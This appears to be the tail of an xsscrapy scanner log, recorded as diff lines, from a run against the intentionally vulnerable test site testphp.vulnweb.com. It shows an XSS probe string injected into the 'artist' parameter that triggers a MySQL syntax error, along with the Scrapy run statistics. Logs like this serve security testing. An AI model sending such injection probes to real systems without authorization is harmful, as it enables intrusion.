+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjzv;9' at line 1
+2022-06-21 14:33:17 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:17 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?artist=1zqjzv'%22()%7B%7D%3Cx%3E:/1zqjzv;9>
+
+
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=1. type = header, cookie
+
+
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=1. type = header, Referer
+
+
+2022-06-21 14:33:17 [scrapy.core.engine] INFO: Closing spider (finished)
+2022-06-21 14:33:17 [scrapy.statscollectors] INFO: Dumping Scrapy stats:
+{'downloader/exception_count': 37,
+ 'downloader/exception_type_count/scrapy.exceptions.IgnoreRequest': 37,
+ 'downloader/request_bytes': 93106,
+ 'downloader/request_count': 240,
+ 'downloader/request_method_count/GET': 225,
+ 'downloader/request_method_count/POST': 15,
+ 'downloader/response_bytes': 572025,
+ 'downloader/response_count': 240,
+ 'downloader/response_status_count/200': 187,
+ 'downloader/response_status_count/302': 3,
+ 'downloader/response_status_count/404': 50,
+ 'elapsed_time_seconds': 6.467396,
+ 'finish_reason': 'finished',
+ 'finish_time': datetime.datetime(2022, 6, 21, 12, 33, 17, 241684),
+ 'httpcompression/response_bytes': 612661,
+ 'httpcompression/response_count': 209,
+ 'httperror/response_ignored_count': 47,
+ 'httperror/response_ignored_status_count/404': 47,
+ 'item_dropped_count': 122,
+ 'item_dropped_reasons_count/DropItem': 122,
+ 'item_scraped_count': 20,
+ 'log_count/DEBUG': 457,
+ 'log_count/INFO': 347,
+ 'log_count/WARNING': 122,
+ 'offsite/domains': 3,
+ 'offsite/filtered': 158,
+ 'request_depth_max': 4,
+ 'response_received_count': 239,
+ 'scheduler/dequeued': 277,
+ 'scheduler/dequeued/memory': 277,
+ 'scheduler/enqueued': 277,
+ 'scheduler/enqueued/memory': 277,
+ 'start_time': datetime.datetime(2022, 6, 21, 12, 33, 10, 774288)}
+2022-06-21 14:33:17 [scrapy.core.engine] INFO: Spider closed (finished)
